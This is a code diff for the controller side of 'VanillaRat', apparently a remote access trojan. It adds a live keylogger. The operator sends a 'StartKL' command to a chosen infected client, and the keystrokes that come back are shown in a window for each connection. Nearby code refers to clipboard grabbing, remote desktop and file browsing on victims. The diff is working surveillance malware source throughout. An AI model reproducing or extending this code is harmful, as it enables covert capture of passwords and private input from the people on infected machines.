@@ -26,7 +26,7 @@ namespace VanillaRat
         public int CurrentSelectedID;
         public FileExplorer FE = new FileExplorer();
         public HardwareUsageViewer HUV = new HardwareUsageViewer();
-
+        public Keylogger K = new Keylogger();
         public ListViewItem LVI;
         public OpenWebsite OW = new OpenWebsite();
         public bool RDActive;
@@ -205,9 +205,36 @@ namespace VanillaRat
                 case 10: //Hardware Usage Type
                     UpdateHardwareUsage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+                case 11: //Keystroke Type
+                    UpdateKeylogger(ConnectionId, Encoding.ASCII.GetString(ToProcess));
+                    break;
+
             }
         }
 
+        public void UpdateKeylogger(int ConnectionId, string Keystroke)
+        {
+            if (K.Visible && K.Text == "Keylogger - " + ConnectionId)
+            {
+                K.txtKeylogger.AppendText(Keystroke + " ");
+            }
+            else
+            {
+                K = new Keylogger();
+                K.Show();
+                K.ConnectionId = ConnectionId;
+                K.Text = "Keylogger - " + ConnectionId;
+                if (K.ConnectionId == ConnectionId)
+                {
+                    if (string.IsNullOrWhiteSpace(K.txtKeylogger.Text))
+                    {
+                        K.txtKeylogger.Text = Keystroke;
+                    }
+                    else
+                        K.txtKeylogger.Text += Environment.NewLine + Keystroke;
+                }
+            }
+        }
         public void UpdateHardwareUsage(int ConnectionId, string UsageData)
         {
             if (HUV.Visible && HUV.Text == "Hardware Usage Viewer - " + ConnectionId)
@@ -558,10 +585,24 @@ namespace VanillaRat
             int ConnectionId = CurrentSelectedID;
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetClipboard"));
         }
-
+        private void btnStartLiveKeylogger_Click(object sender, EventArgs e)
+        {
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            int ConnectionId = CurrentSelectedID;
+            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartKL"));
+            if (!K.Visible)
+            {
+                K = new Keylogger();
+                K.ConnectionId = ConnectionId;
+                K.Text = "Keylogger - " + ConnectionId;
+                K.Show();
+            }
+        }
         #endregion Client Functions
-
-        #region Remote Desktop
 
         public Image ImageToDisplay;
 
@@ -701,8 +742,6 @@ namespace VanillaRat
 
             int ConnectionId = CurrentSelectedID;
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartUsageStream"));
-        }
-
-        #endregion Remote Desktop
+        } 
     }
 }
